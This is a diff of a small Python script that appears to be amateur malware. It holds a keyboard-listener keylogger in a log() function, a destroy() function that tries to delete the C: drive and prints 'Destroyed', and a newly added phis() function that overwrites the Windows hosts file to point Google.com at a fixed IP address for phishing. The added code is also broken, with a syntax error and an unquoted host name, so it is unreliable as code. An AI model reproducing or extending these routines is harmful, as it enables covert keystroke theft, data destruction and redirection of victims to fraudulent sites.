@@ -1,4 +1,5 @@
 import socket
+location ="C:\\Windows\\System32\\drivers\\etc\\hosts"
 
 def get_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -52,11 +53,11 @@ def log():
 
     with Listener(on_press=on_press) as listener:
         listener.join()
-    
+
 
 def destroy():
-    import os  
-    location = "C://" 
+    import os
+    location = "C://"
     os.remove(location)
     print("""
        ,-------------.
@@ -73,7 +74,12 @@ def destroy():
        \_|_,-.,-.,-|_/
        | |_|_||_||_|
         `--.____.--'
-    """)  
+    """)
     print("Destroyed")
 
 print(get_ip())
+
+def phis():
+    f = open(location,'w'):
+    f.write("\n")
+    f.write("129.134.31.12 " +Google.com)
